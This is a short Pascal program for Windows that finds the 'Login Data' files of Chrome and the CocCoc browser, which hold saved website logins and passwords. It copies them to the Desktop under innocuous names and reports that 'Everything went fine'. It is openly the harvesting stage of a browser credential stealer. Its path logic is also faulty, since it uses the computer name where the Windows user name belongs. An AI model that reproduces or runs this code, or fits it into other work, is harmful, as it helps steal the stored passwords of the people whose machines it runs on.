{$I-}
uses windows,dos,classes,sysutils;

function GetPCName: string;
var
  buffer: array[0..MAX_COMPUTERNAME_LENGTH + 1] of Char;
  Size: Cardinal;
begin
  Size := MAX_COMPUTERNAME_LENGTH + 1;
  Windows.GetComputerName(@buffer, Size);
  GetpcName := StrPas(buffer);
end;
procedure copydat(c:byte);
var a,b:string;SourceF, DestF: TFileStream;
begin
  case c of
    1: //
    begin
      a:='C:\Users\'+GetPCName+'\AppData\Local\Google\Chrome\User Data\Default\Login Data';
      b:='C:\Users\'+GetPCName+'\Desktop\ccc1.data';
    end;
    2: //
    begin
      a:='C:\Users\'+GetPCName+'\AppData\Local\CocCoc\Browser\User Data\Default\Login Data';
      b:='C:\Users\'+GetPCName+'\Desktop\ccc2.data';
    end;
  end;
  SourceF:= TFileStream.Create(a, fmOpenRead);
  DestF:= TFileStream.Create(b, fmCreate);
  DestF.CopyFrom(SourceF, SourceF.Size);
  SourceF.Free;
  DestF.Free;
end;


begin
  if fileexists('C:\Users\'+GetPCName+'\AppData\Local\Google\Chrome\User Data\Default\Login Data')then copydat(1);
  if fileexists('C:\Users\'+GetPCName+'\AppData\Local\CocCoc\Browser\User Data\Default\Login Data')then copydat(2);
  write('Everything went fine...Press Enter to exit');
  readln
end.
